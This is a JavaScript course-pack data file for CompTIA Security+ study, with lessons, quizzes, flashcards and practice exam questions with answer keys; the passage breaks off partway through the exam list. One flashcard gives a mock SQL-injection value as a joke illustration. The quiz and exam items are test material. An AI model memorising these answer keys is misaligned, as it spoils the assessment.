/* Mammoth Academy — Course Pack */
/* Auto-loaded by course-loader.js */

var COURSE_COMPTIA_SECURITYPLUS = {
  "meta": {
    "id": "comptia-securityplus",
    "name": "CompTIA Security+",
    "subtitle": "SY0-701",
    "icon": "🛡️",
    "color": "#10b981",
    "examKey": "securityplus",
    "flashcardCat": "CompTIA Security+",
    "dailyTrackKey": "securityplus",
    "domains": {
      "General Security Concepts": "General Security Concepts (Cryptography & IAM)",
      "Threats, Vulnerabilities, and Mitigations": "Threats, Vulnerabilities & The Cost of Downtime",
      "Security Architecture": "The Perimeter is Dead (Zero Trust Architecture)",
      "Security Operations": "Security Operations: Hunting in the Noise",
      "Security Program Management and Oversight": "Program Management & Governance"
    },
    "version": "1.0.0",
    "category": "CompTIA",
    "passThreshold": 0.83,
    "examDurationMinutes": 90,
    "examName": "CompTIA Security+ SY0-701",
    "examFormat": {
      "questions": 90,
      "passLabel": "750 / 900 (scaled)",
      "blueprint": [
        {
          "domain": "Security Operations",
          "label": "Security Operations",
          "weight": 28
        },
        {
          "domain": "Threats, Vulnerabilities, and Mitigations",
          "label": "Threats, Vulnerabilities & Mitigations",
          "weight": 22
        },
        {
          "domain": "Security Program Management and Oversight",
          "label": "Security Program Management & Oversight",
          "weight": 20
        },
        {
          "domain": "Security Architecture",
          "label": "Security Architecture",
          "weight": 18
        },
        {
          "domain": "General Security Concepts",
          "label": "General Security Concepts",
          "weight": 12
        }
      ]
    }
  },
  "modules": [
    {
      "title": "The Perimeter is Dead (Zero Trust Architecture)",
      "topics": [
        {
          "title": "The Perimeter is Dead (Zero Trust Architecture)",
          "prose": "\n<p>For decades, enterprise security relied on a castle-and-moat architecture. You buy a massive firewall (the moat), put all your servers inside (the castle), and assume anyone who makes it inside is a good guy. <strong>That model is dead.</strong> When an attacker spear-phishes Karen in accounting, they don't attack the firewall—they just walk right through the front door using her VPN credentials. Once inside, they move laterally, escalating privileges until they own your domain controllers.</p>\n\n<p><strong>Zero Trust</strong> is the answer. It operates on one brutal truth: <em>Trust nothing, verify everything.</em> Location is no longer a proxy for trust. Just because a request comes from the internal corporate LAN doesn't mean it's legitimate. In a Zero Trust environment, every single request—whether from a coffee shop or a wired desk on the 5th floor—is authenticated, authorized, and encrypted.</p>\n\n<div class=\"lesson-alert\" style=\"border-left-color: var(--accent-warning); background: rgba(245, 158, 11, 0.05);\"><strong>⚓ Anchor:</strong> Think of traditional networking like a nightclub. The bouncer (firewall) checks your ID at the door, but once you're in, you can talk to anyone and drink anything. Zero Trust is like having a personal bodyguard assigned to every single patron. You want to talk to the bartender? Show ID. You want to walk to the bathroom? Show ID. It's high friction for attackers, low blast radius for the business.</div>\n\n<p>In your homelab, this means you don't just dump all your Proxmox containers on a flat `/24` subnet. You segment them. Your public-facing NGINX reverse proxy sits in a DMZ. It talks to your backend database on a dedicated, firewalled VLAN via pfSense, allowing <em>only</em> port 5432, and dropping everything else. <strong>Implicit Deny</strong> is the law of the land.</p>\n\n\n<div class=\"lesson-alert\"><strong>Exam Tip (Security+):</strong> When an answer choice implies trusting a request because it came from the internal LAN, that's the wrong answer under Zero Trust — every request is authenticated and authorized, full stop, regardless of where it originates.</div>",
          "tags": [
            "comptia",
            "security-plus",
            "architecture"
          ],
          "quiz": [
            {
              "q": "What is the foundational principle of a Zero Trust architecture?",
              "opts": [
                "Internal network traffic is inherently secure",
                "Firewalls should inspect all encrypted payloads",
                "Trust no user or device, regardless of their location on the network",
                "All external traffic must be routed through a VPN"
              ],
              "ans": 2,
              "exp": "Zero Trust assumes breach. It requires strict identity verification for every person and device trying to access resources, regardless of whether they are sitting within the network perimeter or accessing it remotely."
            },
            {
              "q": "Which configuration ensures that a firewall blocks any traffic that is not explicitly allowed by an administrator?",
              "opts": [
                "Implicit Deny",
                "Stateful Inspection",
                "Port Security",
                "Access Control List (ACL) Bypass"
              ],
              "ans": 0,
              "exp": "Implicit Deny is the principle that if a condition is not explicitly met by a rule in a firewall or ACL, the traffic should be rejected by default."
            },
            {
              "q": "When setting up a pfSense router to segment a database server from a web server, what concept are you implementing to minimize the blast radius of a web server compromise?",
              "opts": [
                "Network Address Translation (NAT)",
                "Network Segmentation",
                "Load Balancing",
                "Intrusion Detection"
              ],
              "ans": 1,
              "exp": "Network segmentation breaks a network into smaller, isolated subnets or VLANs. If the web server is compromised, the attacker cannot easily pivot to the database server because traffic between the segments is tightly controlled."
            }
          ],
          "diagrams": [
            "zero-trust"
          ]
        }
      ],
      "related": [
        {
          "course": "sales-engineering",
          "idx": 1
        },
        {
          "course": "sales-engineering",
          "idx": 2
        }
      ]
    },
    {
      "title": "Security Operations: Hunting in the Noise",
      "topics": [
        {
          "title": "Security Operations: Hunting in the Noise",
          "prose": "\n<p>Security Operations (SecOps) is where the rubber meets the road. It accounts for <strong>28% of the Security+ exam</strong> because an architecture is only as good as the team monitoring it. If a tree falls in the forest and no one reads the logs, it still crushes your infrastructure.</p>\n\n<p>The core of SecOps is the <strong>SIEM (Security Information and Event Management)</strong>. A SIEM aggregates logs from your firewalls, endpoints, servers, and applications into a single pane of glass. But aggregating logs isn't security—it's just hoarding text files. The real value is <strong>correlation</strong>. When a user logs in from New York, and three minutes later the same user attempts an RDP session from Moscow, the SIEM correlates those impossible travel logs and fires an alert.</p>\n\n<div class=\"lesson-alert\"><strong>Pro Tip:</strong> <em>If you aren't logging it, it didn't happen. If you are logging it but not alerting on it, you're just writing a very detailed autopsy report for the forensic team after your company goes bankrupt.</em></div>\n\n<p><strong>Incident Response (IR) Phases:</strong><br>\n1. <strong>Preparation:</strong> Having playbooks, tools, and contacts ready before the breach.<br>\n2. <strong>Identification:</strong> Determining if an incident actually occurred (e.g., verifying a SIEM alert).<br>\n3. <strong>Containment:</strong> Stopping the bleeding (e.g., isolating a ransomware-infected host from the network).<br>\n4. <strong>Eradication:</strong> Removing the threat (deleting the malware, closing the vulnerability).<br>\n5. <strong>Recovery:</strong> Restoring from backups, bringing systems back online.<br>\n6. <strong>Lessons Learned:</strong> The post-mortem. Updating playbooks so it doesn't happen again.</p>\n\n\n<div class=\"lesson-alert\" style=\"border-left-color: var(--accent-warning); background: rgba(245, 158, 11, 0.05);\"><strong>⚓ Anchor:</strong> A single log line is a whisper in a hurricane — useless alone. A SIEM is the pfSense box on your homelab that doesn't just drop a packet from a scanning bot in Belarus, it notices that same IP hit three different services in ten minutes and escalates it from “noise” to “pattern.” Correlation is what turns a haystack of logs into the one needle that's actually on fire.</div>",
          "tags": [
            "comptia",
            "security-plus",
            "secops"
          ],
          "quiz": [
            {
              "q": "A security analyst notices an alert from the SIEM. They verify that a workstation is actively beaconing to a known malicious command-and-control (C2) server. What is the immediate next step in the Incident Response process?",
              "opts": [
                "Eradication: Delete the malware file",
                "Containment: Disconnect the workstation from the network",
                "Recovery: Reimage the workstation from a golden image",
                "Lessons Learned: Write a post-mortem report"
              ],
              "ans": 1,
              "exp": "Once identified, the immediate priority is Containment—stopping the threat from spreading laterally across the network. Only after it is isolated do you move to Eradicate the threat."
            },
            {
              "q": "What is the primary function of a SIEM system?",
              "opts": [
                "To automatically block incoming DDOS attacks",
                "To encrypt data at rest on enterprise servers",
                "To aggregate, correlate, and analyze log data from across the enterprise",
                "To provide Multi-Factor Authentication for end users"
              ],
              "ans": 2,
              "exp": "A SIEM (Security Information and Event Management) tool collects logs from various sources, correlates events to detect anomalies, and generates actionable alerts for security teams."
            },
            {
              "q": "Which of the following is an example of an 'Impossible Travel' anomaly?",
              "opts": [
                "A user logs in from a known corporate IP, then logs out 5 minutes later",
                "A user authenticates from New York, and 10 minutes later authenticates from London",
                "A user fails their password 3 times before succeeding",
                "A user accesses the network via VPN on a Saturday"
              ],
              "ans": 1,
              "exp": "Impossible travel occurs when a user authenticates from two geographically distant locations in a timeframe that makes physical travel between them impossible, heavily implying compromised credentials."
            }
          ]
        }
      ],
      "related": [
        {
          "course": "comptia-securityplus",
          "idx": 2
        },
        {
          "course": "comptia-securityplus",
          "idx": 3
        }
      ]
    },
    {
      "title": "Threats, Vulnerabilities & The Cost of Downtime",
      "topics": [
        {
          "title": "Threats, Vulnerabilities & The Cost of Downtime",
          "prose": "\n<p>Let's talk business impact. At Mammoth Capital, if our high-frequency trading algorithm goes offline for 60 seconds because of a DDoS attack, we aren't just \"experiencing technical difficulties.\" We are bleeding P&L. Understanding threats isn't about memorizing dictionary definitions of malware; it's about understanding how attackers dismantle business continuity.</p>\n\n<p><strong>Ransomware:</strong> It doesn't just encrypt data; modern ransomware gangs practice <em>double extortion</em>. They encrypt your systems so you can't operate, AND they steal your sensitive data (like proprietary trading algorithms or customer PII) and threaten to leak it if you don't pay. Backups solve the encryption problem; they don't solve the data leak problem. The only defense is stopping the exfiltration in the first place.</p>\n\n<p><strong>Phishing & Social Engineering:</strong> Humans are the weakest link in any cryptographic system. Why burn zero-day exploits against an enterprise firewall when you can just call the helpdesk, pretend to be a frustrated VP who lost his MFA token, and get them to reset it? <em>Vishing</em> (voice phishing) and <em>Smishing</em> (SMS phishing) bypass multi-million dollar tech stacks by exploiting human psychology.</p>\n\n<div class=\"lesson-alert\" style=\"border-left-color: var(--accent-warning); background: rgba(245, 158, 11, 0.05);\"><strong>⚓ Anchor:</strong> Think of vulnerabilities as an open window in your house. The threat is the burglar outside. The risk is the intersection of the two—the likelihood the burglar finds the window and steals your TV. You manage risk by either patching the vulnerability (locking the window) or mitigating the threat (buying a guard dog).</div>\n\n\n<div class=\"lesson-alert\"><strong>Exam Tip (Security+):</strong> Don't confuse a Threat, a Vulnerability, and a Risk. The unpatched CVE is the vulnerability. The attacker group scanning for it is the threat. Risk is the two multiplied together — likelihood × impact. A critical vulnerability with no active exploitation in the wild can be lower risk than a medium one under real-world attack.</div>",
          "tags": [
            "comptia",
            "security-plus",
            "threats"
          ],
          "quiz": [
            {
              "q": "An attacker compromises a company's database, encrypts the hard drives, and demands Bitcoin for the decryption key. They also threaten to release customer data to the public if the ransom is not paid. What type of attack is this?",
              "opts": [
                "Cryptojacking",
                "Double Extortion Ransomware",
                "Distributed Denial of Service (DDoS)",
                "SQL Injection"
              ],
              "ans": 1,
              "exp": "Double extortion involves both encrypting the victim's data to halt operations and stealing sensitive data to threaten public release, increasing the pressure to pay."
            },
            {
              "q": "An employee receives a text message claiming to be from the IT department, urging them to click a link to reset an expired password. What kind of attack is this?",
              "opts": [
                "Vishing",
                "Pharming",
                "Smishing",
                "Whaling"
              ],
              "ans": 2,
              "exp": "Smishing (SMS Phishing) uses text messages to trick victims into clicking malicious links or revealing sensitive information."
            },
            {
              "q": "Which formula accurately describes how Security professionals calculate Risk?",
              "opts": [
                "Risk = Threat × Vulnerability",
                "Risk = Malware + Human Error",
                "Risk = Exploit ÷ Controls",
                "Risk = Perimeter Defenses - Attack Vectors"
              ],
              "ans": 0,
              "exp": "Risk is typically evaluated as the intersection of a Threat (a potential danger) and a Vulnerability (a weakness). If either is zero, there is no active risk."
            }
          ]
        }
      ],
      "related": [
        {
          "course": "comptia-securityplus",
          "idx": 3
        },
        {
          "course": "comptia-securityplus",
          "idx": 4
        }
      ]
    },
    {
      "title": "Program Management & Governance",
      "topics": [
        {
          "title": "Program Management & Governance",
          "prose": "<p>Security isn't just firewalls; it's paperwork with teeth. <strong>Program Management</strong> (20% of the exam) covers the policies, compliance (like HIPAA, GDPR), and risk assessments that dictate what the firewalls should actually do.</p><div class=\"lesson-alert\" style=\"border-left-color: var(--accent-warning); background: rgba(245, 158, 11, 0.05);\"><strong>⚓ Anchor:</strong> If you buy the best locks in the world but have no policy saying employees must lock the doors when they leave, you have no security. Governance is the policy. Architecture is the lock. SecOps is the alarm.</div>\n\n<div class=\"lesson-alert\"><strong>Exam Tip (Security+):</strong> Governance questions usually hinge on WHO is accountable, not who does the work. A Data Owner (typically a business exec) is accountable for classifying data; a Data Custodian (typically IT) just implements the controls the owner requires.</div>",
          "tags": [
            "comptia",
            "security-plus",
            "governance"
          ],
          "quiz": [
            {
              "q": "Which policy dictates what an employee can and cannot do on a corporate laptop?",
              "opts": [
                "SLA",
                "AUP",
                "NDA",
                "MOU"
              ],
              "ans": 1,
              "exp": "The Acceptable Use Policy (AUP) outlines permitted behaviors on corporate devices."
            },
            {
              "q": "A company requires two executives to sign off before transferring funds over $10,000. What principle is this?",
              "opts": [
                "Least Privilege",
                "Job Rotation",
                "Dual Control",
                "Mandatory Access Control"
              ],
              "ans": 2,
              "exp": "Dual control (or separation of duties) requires two individuals to complete a critical task."
            },
            {
              "q": "Which metric defines the maximum amount of data loss a company can tolerate after a disaster?",
              "opts": [
                "RTO",
                "RPO",
                "MTTR",
                "MTBF"
              ],
              "ans": 1,
              "exp": "Recovery Point Objective (RPO) is the acceptable amount of data loss, measured in time (e.g., restoring from a 24-hour old backup)."
            }
          ]
        }
      ],
      "related": [
        {
          "course": "comptia-securityplus",
          "idx": 4
        },
        {
          "course": "comptia-securityplus",
          "idx": 0
        }
      ]
    },
    {
      "title": "General Security Concepts (Cryptography & IAM)",
      "topics": [
        {
          "title": "General Security Concepts (Cryptography & IAM)",
          "prose": "<p>Cryptography is the math that keeps the internet from collapsing. General Security Concepts covers hashing, encryption, and Identity & Access Management (IAM).</p><p><strong>Symmetric vs. Asymmetric:</strong> Symmetric uses one key (fast, used for bulk data like AES). Asymmetric uses two keys (public/private, slower, used for key exchange and digital signatures like RSA).</p>\n\n<p>Hashing is the other half of the equation — a one-way function that turns any input into a fixed-length fingerprint. You never decrypt a hash; you re-hash the input and compare fingerprints, which is how a login form verifies your password without ever storing the actual password. That's also why a leaked hash database is still a five-alarm fire: attackers just brute-force or rainbow-table guesses until one matches. Identity & Access Management wraps around all of it with the AAA framework — <strong>Authentication</strong> (who are you, prove it), <strong>Authorization</strong> (what are you allowed to touch), and <strong>Accounting</strong> (what did you actually do, logged for the audit trail).</p></p>\n\n<div class=\"lesson-alert\" style=\"border-left-color: var(--accent-warning); background: rgba(245, 158, 11, 0.05);\"><strong>⚓ Anchor:</strong> Symmetric encryption is the single key to your Proxmox server rack — fast, but you and everyone who needs access share the exact same key, so losing it means re-keying everything. Asymmetric is a mailbox with a slot: anyone can drop a locked letter in (encrypt with your public key), but only you hold the key that opens the box (your private key) to read it. AES protects the bulk data; RSA/ECC handles the handshake that safely exchanges the AES key in the first place.</div>\n\n<div class=\"lesson-alert\"><strong>Exam Tip (Security+):</strong> If a question emphasizes speed and bulk data (disk encryption, VPN tunnels), the answer is symmetric (AES). If it emphasizes key exchange, digital signatures, or “proving identity without sharing a secret,” the answer is asymmetric (RSA/ECC).</div>",
          "tags": [
            "comptia",
            "security-plus",
            "crypto"
          ],
          "quiz": [
            {
              "q": "Which algorithm is used to ensure data integrity by creating a fixed-size unique output from a variable-size input?",
              "opts": [
                "AES",
                "RSA",
                "SHA-256",
                "ECC"
              ],
              "ans": 2,
              "exp": "SHA-256 is a hashing algorithm. Hashes provide integrity, not confidentiality."
            },
            {
              "q": "When sending an encrypted email using asymmetric encryption, which key is used to encrypt the message?",
              "opts": [
                "The sender's public key",
                "The sender's private key",
                "The recipient's public key",
                "The recipient's private key"
              ],
              "ans": 2,
              "exp": "You encrypt the message with the recipient's public key so that only the recipient can decrypt it with their private key."
            },
            {
              "q": "Which IAM model relies on clearance levels and classification labels (e.g., Top Secret)?",
              "opts": [
                "MAC",
                "DAC",
                "RBAC",
                "ABAC"
              ],
              "ans": 0,
              "exp": "Mandatory Access Control (MAC) uses labels and clearances, strictly enforced by the OS, commonly used in military environments."
            }
          ]
        }
      ],
      "related": [
        {
          "course": "comptia-securityplus",
          "idx": 0
        },
        {
          "course": "comptia-securityplus",
          "idx": 1
        }
      ]
    }
  ],
  "flashcards": [
    {
      "id": 1,
      "cat": "CompTIA Security+",
      "domain": "Architecture",
      "front": "Zero Trust Architecture",
      "back": "A security model centered on the belief that organizations should not automatically trust anything inside or outside its perimeters. 'Never trust, always verify.'",
      "analogy": "Like a nightclub where instead of a bouncer at the door, every single patron has a personal bodyguard checking their ID before they can take a sip of their drink."
    },
    {
      "id": 101,
      "cat": "CompTIA Security+",
      "domain": "General Security Concepts",
      "front": "CIA Triad",
      "back": "Confidentiality (Encryption), Integrity (Hashing), Availability (Redundancy).",
      "analogy": "The holy trinity of security. Confidentiality = keeping a secret. Integrity = knowing the secret wasn't altered. Availability = actually being able to read the secret when you need to."
    },
    {
      "id": 102,
      "cat": "CompTIA Security+",
      "domain": "General Security Concepts",
      "front": "Non-Repudiation",
      "back": "Proving that a specific user performed an action, preventing them from denying it later. Achieved via Digital Signatures.",
      "analogy": "A notary stamp on a contract. You can't say 'I didn't sign that' if your verified signature is on it."
    },
    {
      "id": 103,
      "cat": "CompTIA Security+",
      "domain": "Threats",
      "front": "Phishing vs. Spear Phishing vs. Whaling",
      "back": "Phishing = Broad net. Spear Phishing = Targeted at a specific person. Whaling = Targeted at a C-level executive.",
      "analogy": "Phishing is throwing dynamite in a lake. Spear phishing is using a sniper rifle. Whaling is hunting Moby Dick."
    },
    {
      "id": 104,
      "cat": "CompTIA Security+",
      "domain": "Threats",
      "front": "SQL Injection (SQLi)",
      "back": "Attacker inputs SQL commands into web forms to manipulate the backend database. Mitigated by Parameterized Queries.",
      "analogy": "Like telling the bouncer at the club that your name is 'John DROP TABLE Users;'."
    },
    {
      "id": 105,
      "cat": "CompTIA Security+",
      "domain": "Architecture",
      "front": "Air Gap",
      "back": "A physical security measure where a secure network is physically isolated from unsecured networks (like the internet).",
      "analogy": "Cutting the actual bridge to the castle. The only way in is to physically walk across the moat with a USB drive."
    },
    {
      "id": 106,
      "cat": "CompTIA Security+",
      "domain": "Architecture",
      "front": "Honeypot",
      "back": "A decoy system designed to lure attackers to study their methods without risking production data.",
      "analogy": "A fake vault in a bank filled with tracking dye to catch burglars while the real vault remains hidden."
    },
    {
      "id": 107,
      "cat": "CompTIA Security+",
      "domain": "SecOps",
      "front": "SIEM (Security Information and Event Management)",
      "back": "A centralized tool that collects, stores, and correlates logs from across the enterprise to detect threats.",
      "analogy": "The command center of a casino where security watches 1,000 cameras at once and correlates when a known cheat walks in."
    },
    {
      "id": 108,
      "cat": "CompTIA Security+",
      "domain": "SecOps",
      "front": "Incident Response: Containment",
      "back": "The phase where you isolate the threat to prevent lateral movement (e.g., unplugging an infected machine or disabling a port).",
      "analogy": "Closing the blast doors on a spaceship when there's a hull breach to save the rest of the ship."
    },
    {
      "id": 109,
      "cat": "CompTIA Security+",
      "domain": "Program Management",
      "front": "RTO vs RPO",
      "back": "RTO (Recovery Time Objective): Max allowed downtime. RPO (Recovery Point Objective): Max allowed data loss (age of backups).",
      "analogy": "RTO = How long until the store reopens after a fire. RPO = How much inventory was lost in the fire."
    },
    {
      "id": 110,
      "cat": "CompTIA Security+",
      "domain": "Program Management",
      "front": "Separation of Duties",
      "back": "Requiring more than one person to complete a critical task to prevent fraud and errors.",
      "analogy": "It takes two different keys turned simultaneously to launch the nuclear missile."
    },
    {
      "id": 208,
      "cat": "CompTIA Security+",
      "domain": "Security",
      "front": "DHCP Snooping",
      "back": "A switch feature that drops DHCP offers from untrusted ports to prevent rogue DHCP server attacks.",
      "analogy": "A bouncer checking IDs to make sure nobody is handing out fake VIP passes in the club."
    },
    {
      "id": 406,
      "cat": "CompTIA Security+",
      "domain": "Security",
      "front": "Shared Responsibility Model",
      "back": "The provider secures the cloud (hardware, hypervisor). The customer secures what is IN the cloud (data, OS, IAM).",
      "analogy": "The landlord secures the apartment building doors. You are responsible for locking your own apartment door."
    },
    {
      "id": 407,
      "cat": "CompTIA Security+",
      "domain": "Security",
      "front": "CloudTrail / Audit Logging",
      "back": "Services that record API calls, tracking exactly who made a change, when, and from what IP address.",
      "analogy": "The security camera footage showing exactly who unlocked the server room door at 2:00 AM."
    }
  ],
  "exam": [
    {
      "q": "A threat actor compromises a single workstation and uses an open SMB port to spread ransomware automatically to every other workstation on the flat /24 subnet. What architectural failure allowed this?",
      "opts": [
        "Lack of Network Segmentation",
        "Failure to implement Multi-Factor Authentication",
        "Outdated Anti-Virus signatures",
        "Insufficient bandwidth on the core switch"
      ],
      "ans": 0,
      "exp": "While AV or MFA might have stopped the initial compromise, the lack of network segmentation (a flat network) is the architectural failure that allowed the malware to spread laterally without friction.",
      "domain": "Security Architecture",
      "whyWrong": [
        "",
        "Multi-Factor Authentication protects initial user login, not peer-to-peer lateral movement over SMB after a workstation on a flat subnet is already compromised.",
        "Outdated antivirus signatures are an endpoint control failure on individual hosts, not the network architecture flaw that permitted unrestricted east-west SMB traffic.",
        "Insufficient switch bandwidth would slow network throughput, not allow ransomware to propagate freely between workstations."
      ]
    },
    {
      "q": "A company requires employees to insert a smart card and scan their fingerprint to enter the server room. Which authentication factors are being used?",
      "opts": [
        "Something you know and something you are",
        "Something you have and something you know",
        "Something you have and something you are",
        "Something you are and somewhere you are"
      ],
      "ans": 2,
      "exp": "A smart card is a physical token ('Something you have'), and a fingerprint is a biometric identifier ('Something you are').",
      "domain": "General Security Concepts",
      "whyWrong": [
        "Something you know refers to a password or PIN, which is not required here; a smart card is a physical possession factor ('something you have').",
        "While a smart card is 'something you have,' a fingerprint is a biometric trait ('something you are'), not a knowledge factor ('something you know').",
        "",
        "Somewhere you are refers to geolocation or IP/GPS location checks, whereas a smart card is a physical possession factor ('something you have')."
      ]
    },
    {
      "q": "A Chief Information Security Officer (CISO) is defining the access control model for a new HR application. The requirement states that access must be granted based on the user's department, clearance level, and the time of day. Which of the following access control models is the BEST fit?",
      "opts": [
        "Role-Based Access Control (RBAC)",
        "Discretionary Access Control (DAC)",
        "Mandatory Access Control (MAC)",
        "Attribute-Based Access Control (ABAC)"
      ],
      "ans": 3,
      "exp": "ABAC grants access based on a combination of attributes, such as user role, time of day, location, and device status. RBAC only looks at the user's role.",
      "domain": "General Security Concepts",
      "whyWrong": [
        "Role-Based Access Control (RBAC) assigns permissions strictly by job role or group membership and cannot evaluate dynamic context like time of day.",
        "Discretionary Access Control (DAC) lets each resource owner decide who gets access (like standard file permissions), rather than enforcing multi-attribute policies.",
        "Mandatory Access Control (MAC) enforces rigid clearance labels (like Top Secret) set by a central authority, without evaluating dynamic environmental attributes like time of day.",
        ""
      ]
    },
    {
      "q": "Which cryptographic concept ensures that a sender cannot later deny having sent a specific message?",
      "opts": [
        "Confidentiality",
        "Integrity",
        "Non-repudiation",
        "Obfuscation"
      ],
      "ans": 2,
      "exp": "Non-repudiation (often achieved via digital signatures) proves that a specific user sent a message and prevents them from denying it later.",
      "domain": "General Security Concepts",
      "whyWrong": [
        "Confidentiality ensures unauthorized parties cannot read data (via encryption), without proving who sent the message.",
        "Integrity proves that a message was not altered in transit (via hashing), but a plain hash alone does not bind the message to a specific sender's identity.",
        "",
        "Obfuscation makes code or data harder for humans to read and reverse-engineer, offering no cryptographic proof of origin."
      ]
    },
    {
      "q": "An organization wants to securely exchange encryption keys over an untrusted network (the internet) without physically sending the keys. Which algorithm is BEST suited for this task?",
      "opts": [
        "AES-256",
        "RSA",
        "Diffie-Hellman",
        "SHA-256"
      ],
      "ans": 2,
      "exp": "Diffie-Hellman is a key exchange protocol specifically designed to allow two parties to establish a shared secret key over an insecure channel.",
      "domain": "General Security Concepts",
      "whyWrong": [
        "AES-256 is a symmetric block cipher that requires both parties to already share the secret key; it cannot establish that key over an untrusted channel by itself.",
        "While RSA can encrypt a key transport payload, Diffie-Hellman is the dedicated key-agreement algorithm designed for two parties to derive a shared secret without ever transmitting the key.",
        "",
        "SHA-256 is a one-way cryptographic hashing algorithm used for integrity verification, not key exchange or encryption."
      ]
    },
    {
      "q": "A security analyst notices a spike in CPU usage on several web servers. Upon investigation, they discover unauthorized cryptocurrency mining software running on the servers. What type of attack has occurred?",
      "opts": [
        "Ransomware",
        "Cryptojacking",
        "Logic Bomb",
        "Rootkit"
      ],
      "ans": 1,
      "exp": "Cryptojacking involves unauthorized use of a victim's computing resources to mine cryptocurrency.",
      "domain": "Threats, Vulnerabilities, and Mitigations",
      "whyWrong": [
        "Ransomware encrypts files and demands extortion payment to restore access, rather than silently hijacking CPU cycles to mine cryptocurrency.",
        "",
        "A logic bomb is dormant malicious code that detonates only when a specific trigger condition (like a date or user deletion) occurs.",
        "A rootkit is stealth malware that hides processes and files at the OS kernel or firmware level, not the act of mining cryptocurrency on stolen compute."
      ]
    },
    {
      "q": "A user receives an email that appears to be from their bank, stating their account has been compromised and providing a link to 'reset their password.' The link directs the user to a fake website. What type of attack is this?",
      "opts": [
        "Phishing",
        "Spear Phishing",
        "Whaling",
        "Vishing"
      ],
      "ans": 0,
      "exp": "Phishing is a broad social engineering attack via email designed to trick users into providing credentials or sensitive info. Spear phishing targets specific individuals, while whaling targets executives.",
      "domain": "Threats, Vulnerabilities, and Mitigations",
      "whyWrong": [
        "",
        "Spear phishing uses researched, personalized details targeting a specific individual or group, whereas a generic fake bank alert is standard mass phishing.",
        "Whaling is a targeted spear-phishing attack aimed specifically at C-level executives or senior leadership.",
        "Vishing (voice phishing) is conducted over phone calls or voicemail rather than via email links."
      ]
    },
    {
      "q": "An attacker intercepts communication between a client and a web server, downgrades the encryption protocol to an older, vulnerable version, and captures the plaintext data. What type of attack is this?",
      "opts": [
        "On-path (Man-in-the-Middle) attack",
        "Replay attack",
        "Pass-the-Hash attack",
        "Cross-Site Scripting (XSS)"
      ],
      "ans": 0,
      "exp": "An on-path (formerly Man-in-the-Middle) attack occurs when an attacker intercepts and alters communication between two parties, such as forcing a protocol downgrade.",
      "domain": "Threats, Vulnerabilities, and Mitigations",
      "whyWrong": [
        "",
        "A replay attack passively captures a valid authentication token or packet and retransmits it later without actively negotiating a protocol downgrade between the two endpoints.",
        "Pass-the-Hash reuses a stolen NTLM/LM password hash to authenticate laterally on a network without cracking the plaintext password.",
        "Cross-Site Scripting (XSS) injects malicious client-side scripts into web pages viewed by other users, rather than intercepting and downgrading network transport encryption."
      ]
    },
    {
      "q": "A threat actor inserts malicious code into an open-source library that is widely used by many enterprise applications. When organizations update the library, their systems become compromised. What type of attack is this?",
      "opts": [
        "Watering Hole attack",
        "Supply Chain attack",
        "Zero-day attack",
        "Cross-Site Request Forgery (CSRF)"
      ],
      "ans": 1,
      "exp": "A supply chain attack targets the software development lifecycle, compromising a vendor or dependency to infect all downstream users.",
      "domain": "Threats, Vulnerabilities, and Mitigations",
      "whyWrong": [
        "A watering hole attack compromises a third-party website that target victims frequently visit in their browsers, rather than poisoning an upstream software dependency.",
        "",
        "A zero-day attack exploits a previously unknown vulnerability that has no vendor patch, rather than trojanizing a trusted software library update.",
        "Cross-Site Request Forgery (CSRF) tricks a victim's authenticated browser into submitting an unwanted web request, not compromising an upstream code package."
      ]
    },
    {
      "q": "Which of the following is the BEST mitigation against Pass-the-Hash (PtH) attacks in a Windows environment?",
      "opts": [
        "Implementing WPA3 on the wireless network",
        "Disabling NTLM and forcing Kerberos authentication",
        "Installing a host-based firewall",
        "Updating anti-virus signatures daily"
      ],
      "ans": 1,
      "exp": "Pass-the-Hash exploits NTLM hashes. Disabling NTLM in favor of Kerberos (and utilizing features like Windows Defender Credential Guard) mitigates PtH.",
      "domain": "Threats, Vulnerabilities, and Mitigations",
      "whyWrong": [
        "WPA3 secures wireless Layer 2 authentication and encryption against offline dictionary attacks, which does not stop NTLM hash reuse inside a Windows domain.",
        "",
        "A host-based firewall can restrict lateral SMB/RPC ports, but it does not fix the underlying vulnerability of NTLM accepting raw password hashes without salted tickets.",
        "Pass-the-Hash uses built-in Windows authentication protocols and living-off-the-land tools that often bypass traditional signature-based antivirus."
      ]
    },
    {
      "q": "A security assessment reveals that an application accepts user input without validation, allowing an attacker to execute arbitrary SQL commands on the backend database. What is the BEST remediation for this vulnerability?",
      "opts": [
        "Implement a Web Application Firewall (WAF)",
        "Use parameterized queries (prepared statements)",
        "Encrypt the database at rest",
        "Require Multi-Factor Authentication"
      ],
      "ans": 1,
      "exp": "While a WAF can block some attacks, the best and most fundamental remediation for SQL injection is using parameterized queries in the application code.",
      "domain": "Threats, Vulnerabilities, and Mitigations",
      "whyWrong": [
        "A WAF provides a helpful defense-in-depth filter at the perimeter, but attackers can sometimes bypass WAF rules; parameterized queries fix the SQL injection flaw in the code itself.",
        "",
        "Encrypting the database at rest protects against physical disk theft, but the database engine transparently decrypts data for any SQL query executed by the application.",
        "Multi-Factor Authentication strengthens user login, but an authenticated user (or a public login form itself) can still submit SQL injection payloads if queries aren't parameterized."
      ]
    },
    {
      "q": "An attacker targets a company's DNS server and alters the records so that users trying to access the company's intranet are redirected to a malicious server. What is this attack called?",
      "opts": [
        "DNS Poisoning",
        "ARP Spoofing",
        "Domain Hijacking",
        "MAC Flooding"
      ],
      "ans": 0,
      "exp": "DNS Poisoning (or DNS Spoofing) corrupts the DNS cache to redirect traffic to a malicious IP address.",
      "domain": "Threats, Vulnerabilities, and Mitigations",
      "whyWrong": [
        "",
        "ARP spoofing sends forged Layer 2 ARP replies on a local subnet to map an IP to the attacker's MAC address, without modifying records on a DNS server.",
        "Domain hijacking steals control of a public domain's registration at the registrar level, rather than corrupting records on an internal DNS server.",
        "MAC flooding overwhelms a network switch's CAM table with fake source MAC addresses so the switch fails open like a hub."
      ]
    },
    {
      "q": "An organization wants to allow third-party developers to access specific backend APIs without exposing the internal network or the raw API endpoints. Which architectural component should they deploy?",
      "opts": [
        "Reverse Proxy",
        "Virtual Private Network (VPN)",
        "API Gateway",
        "Intrusion Prevention System (IPS)"
      ],
      "ans": 2,
      "exp": "An API Gateway sits between clients and services, providing API routing, rate limiting, authentication, and security without exposing the internal architecture.",
      "domain": "Security Architecture",
      "whyWrong": [
        "A generic reverse proxy forwards HTTP requests to backend servers, but lacks dedicated API management features like per-developer API keys, quota throttling, and schema validation.",
